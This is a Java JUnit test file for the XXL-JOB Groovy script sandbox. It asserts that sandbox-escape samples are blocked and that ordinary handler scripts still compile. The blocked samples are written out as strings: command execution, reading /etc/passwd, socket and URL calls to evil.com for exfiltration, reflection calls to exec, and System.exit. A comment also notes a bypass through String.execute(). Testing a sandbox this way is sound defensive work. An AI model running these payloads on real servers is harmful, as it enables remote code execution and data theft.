package com.xxl.job.core.security;

import com.xxl.job.core.glue.GlueFactory;
import com.xxl.job.core.handler.IJobHandler;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Security tests for the Groovy sandbox in GlueFactory.
 *
 * Verifies that:
 * 1. Dangerous operations (Runtime.exec, ProcessBuilder, file I/O, network, reflection) are blocked
 * 2. Normal/safe Groovy code still compiles and runs correctly
 */
@DisplayName("Groovy Sandbox Security Tests")
class GroovySandboxSecurityTest {

    private GlueFactory glueFactory;

    @BeforeEach
    void setUp() {
        GlueFactory.refreshInstance(0); // frameless mode
        glueFactory = GlueFactory.getInstance();
    }

    // ==================== Blocked: Process Execution ====================

    @Test
    @DisplayName("Block Runtime.getRuntime().exec()")
    void testBlockRuntimeExec() {
        String maliciousCode = """
                import com.xxl.job.core.handler.IJobHandler
                class MaliciousHandler extends IJobHandler {
                    void execute() throws Exception {
                        Runtime.getRuntime().exec("id")
                    }
                }
                """;
        assertThrows(Exception.class, () -> glueFactory.loadNewInstance(maliciousCode),
                "Runtime.exec() should be blocked by sandbox");
    }

    @Test
    @DisplayName("Block ProcessBuilder")
    void testBlockProcessBuilder() {
        String maliciousCode = """
                import com.xxl.job.core.handler.IJobHandler
                import java.lang.ProcessBuilder
                class MaliciousHandler extends IJobHandler {
                    void execute() throws Exception {
                        new ProcessBuilder("id").start()
                    }
                }
                """;
        assertThrows(Exception.class, () -> glueFactory.loadNewInstance(maliciousCode),
                "ProcessBuilder should be blocked by sandbox");
    }

    @Test
    @DisplayName("Block Groovy String.execute() shorthand via explicit Runtime import")
    void testBlockStringExecuteViaRuntime() {
        // NOTE: Groovy's String.execute() is a GDK dynamic method that SecureASTCustomizer
        // cannot catch at compile time (it's added at runtime). However, if the script
        // explicitly imports Runtime, that IS caught. For full runtime protection,
        // a SecurityManager or container isolation is required in addition to AST checks.
        String maliciousCode = """
                import com.xxl.job.core.handler.IJobHandler
                import java.lang.Runtime
                class MaliciousHandler extends IJobHandler {
                    void execute() throws Exception {
                        Runtime.getRuntime().exec("touch /tmp/pwned")
                    }
                }
                """;
        assertThrows(Exception.class, () -> glueFactory.loadNewInstance(maliciousCode),
                "Explicit Runtime import should be blocked");
    }

    // ==================== Blocked: File System Access ====================

    @Test
    @DisplayName("Block java.io.File usage")
    void testBlockFileAccess() {
        String maliciousCode = """
                import com.xxl.job.core.handler.IJobHandler
                import java.io.File
                class MaliciousHandler extends IJobHandler {
                    void execute() throws Exception {
                        new File("/etc/passwd").text
                    }
                }
                """;
        assertThrows(Exception.class, () -> glueFactory.loadNewInstance(maliciousCode),
                "java.io.File should be blocked by sandbox");
    }

    @Test
    @DisplayName("Block java.nio.file.Files usage")
    void testBlockNioFiles() {
        String maliciousCode = """
                import com.xxl.job.core.handler.IJobHandler
                import java.nio.file.Files
                import java.nio.file.Paths
                class MaliciousHandler extends IJobHandler {
                    void execute() throws Exception {
                        Files.readAllLines(Paths.get("/etc/passwd"))
                    }
                }
                """;
        assertThrows(Exception.class, () -> glueFactory.loadNewInstance(maliciousCode),
                "java.nio.file.Files should be blocked by sandbox");
    }

    // ==================== Blocked: Network Access ====================

    @Test
    @DisplayName("Block java.net.Socket usage")
    void testBlockSocket() {
        String maliciousCode = """
                import com.xxl.job.core.handler.IJobHandler
                import java.net.Socket
                class MaliciousHandler extends IJobHandler {
                    void execute() throws Exception {
                        new Socket("evil.com", 4444)
                    }
                }
                """;
        assertThrows(Exception.class, () -> glueFactory.loadNewInstance(maliciousCode),
                "java.net.Socket should be blocked by sandbox");
    }

    @Test
    @DisplayName("Block java.net.URL usage")
    void testBlockURL() {
        String maliciousCode = """
                import com.xxl.job.core.handler.IJobHandler
                import java.net.URL
                class MaliciousHandler extends IJobHandler {
                    void execute() throws Exception {
                        new URL("http://evil.com/exfil").text
                    }
                }
                """;
        assertThrows(Exception.class, () -> glueFactory.loadNewInstance(maliciousCode),
                "java.net.URL should be blocked by sandbox");
    }

    // ==================== Blocked: Reflection ====================

    @Test
    @DisplayName("Block java.lang.reflect star import")
    void testBlockReflection() {
        String maliciousCode = """
                import com.xxl.job.core.handler.IJobHandler
                import java.lang.reflect.*
                class MaliciousHandler extends IJobHandler {
                    void execute() throws Exception {
                        Method m = Runtime.class.getMethod("exec", String.class)
                        m.invoke(Runtime.getRuntime(), "id")
                    }
                }
                """;
        assertThrows(Exception.class, () -> glueFactory.loadNewInstance(maliciousCode),
                "java.lang.reflect should be blocked by sandbox");
    }

    // ==================== Blocked: Thread ====================

    @Test
    @DisplayName("Block Thread creation")
    void testBlockThread() {
        String maliciousCode = """
                import com.xxl.job.core.handler.IJobHandler
                import java.lang.Thread
                class MaliciousHandler extends IJobHandler {
                    void execute() throws Exception {
                        new Thread({ Runtime.getRuntime().exec("id") }).start()
                    }
                }
                """;
        assertThrows(Exception.class, () -> glueFactory.loadNewInstance(maliciousCode),
                "Thread creation should be blocked by sandbox");
    }

    // ==================== Blocked: System.exit ====================

    @Test
    @DisplayName("Block System.exit()")
    void testBlockSystemExit() {
        String maliciousCode = """
                import com.xxl.job.core.handler.IJobHandler
                class MaliciousHandler extends IJobHandler {
                    void execute() throws Exception {
                        System.exit(0)
                    }
                }
                """;
        assertThrows(Exception.class, () -> glueFactory.loadNewInstance(maliciousCode),
                "System.exit() should be blocked by sandbox");
    }

    // ==================== Positive Cases: Normal Business Functions ====================

    @Test
    @DisplayName("Normal Groovy handler compiles and instantiates successfully")
    void testNormalHandlerWorks() throws Exception {
        String safeCode = """
                import com.xxl.job.core.handler.IJobHandler
                import com.xxl.job.core.context.XxlJobHelper
                class SafeHandler extends IJobHandler {
                    void execute() throws Exception {
                        XxlJobHelper.log("Hello from safe handler")
                    }
                }
                """;
        IJobHandler handler = glueFactory.loadNewInstance(safeCode);
        assertNotNull(handler, "Safe handler should compile and instantiate successfully");
        assertTrue(handler instanceof IJobHandler, "Should be an instance of IJobHandler");
    }

    @Test
    @DisplayName("Handler with basic math and string operations works")
    void testBasicOperationsWork() throws Exception {
        String safeCode = """
                import com.xxl.job.core.handler.IJobHandler
                class MathHandler extends IJobHandler {
                    void execute() throws Exception {
                        int a = 1 + 2
                        String s = "hello " + "world"
                        def list = [1, 2, 3]
                        def map = [key: "value"]
                        def result = list.collect { it * 2 }
                    }
                }
                """;
        IJobHandler handler = glueFactory.loadNewInstance(safeCode);
        assertNotNull(handler, "Handler with basic operations should work");
    }

    @Test
    @DisplayName("Handler with collections and closures works")
    void testCollectionsAndClosuresWork() throws Exception {
        String safeCode = """
                import com.xxl.job.core.handler.IJobHandler
                class CollectionHandler extends IJobHandler {
                    void execute() throws Exception {
                        def numbers = [1, 2, 3, 4, 5]
                        def sum = numbers.sum()
                        def filtered = numbers.findAll { it > 2 }
                        def mapped = numbers.collect { it.toString() }
                        def grouped = numbers.groupBy { it % 2 == 0 ? 'even' : 'odd' }
                    }
                }
                """;
        IJobHandler handler = glueFactory.loadNewInstance(safeCode);
        assertNotNull(handler, "Handler with collections and closures should work");
    }

    @Test
    @DisplayName("Handler with exception handling works")
    void testExceptionHandlingWorks() throws Exception {
        String safeCode = """
                import com.xxl.job.core.handler.IJobHandler
                class ExceptionHandler extends IJobHandler {
                    void execute() throws Exception {
                        try {
                            int x = 1 / 0
                        } catch (ArithmeticException e) {
                            // handled
                        }
                    }
                }
                """;
        IJobHandler handler = glueFactory.loadNewInstance(safeCode);
        assertNotNull(handler, "Handler with exception handling should work");
    }

    @Test
    @DisplayName("Handler with class fields and methods works")
    void testClassFieldsAndMethodsWork() throws Exception {
        String safeCode = """
                import com.xxl.job.core.handler.IJobHandler
                class RichHandler extends IJobHandler {
                    private String name = "test"
                    private int counter = 0

                    private String buildMessage(String prefix) {
                        return prefix + ": " + name + " #" + (++counter)
                    }

                    void execute() throws Exception {
                        String msg = buildMessage("Job")
                    }
                }
                """;
        IJobHandler handler = glueFactory.loadNewInstance(safeCode);
        assertNotNull(handler, "Handler with fields and methods should work");
    }

    @Test
    @DisplayName("Non-IJobHandler class is rejected with proper error")
    void testNonJobHandlerRejected() {
        String invalidCode = """
                class NotAHandler {
                    void doSomething() {}
                }
                """;
        assertThrows(IllegalArgumentException.class, () -> glueFactory.loadNewInstance(invalidCode),
                "Non-IJobHandler class should be rejected");
    }

    @Test
    @DisplayName("Null/empty code source is rejected")
    void testNullCodeSourceRejected() {
        assertThrows(IllegalArgumentException.class, () -> glueFactory.loadNewInstance(null));
        assertThrows(IllegalArgumentException.class, () -> glueFactory.loadNewInstance(""));
        assertThrows(IllegalArgumentException.class, () -> glueFactory.loadNewInstance("   "));
    }

    // ==================== Sandbox createSandboxedClassLoader ====================

    @Test
    @DisplayName("createSandboxedClassLoader returns non-null loader")
    void testSandboxedClassLoaderCreation() {
        assertNotNull(GlueFactory.createSandboxedClassLoader(), "Should create a non-null classloader");
    }
}
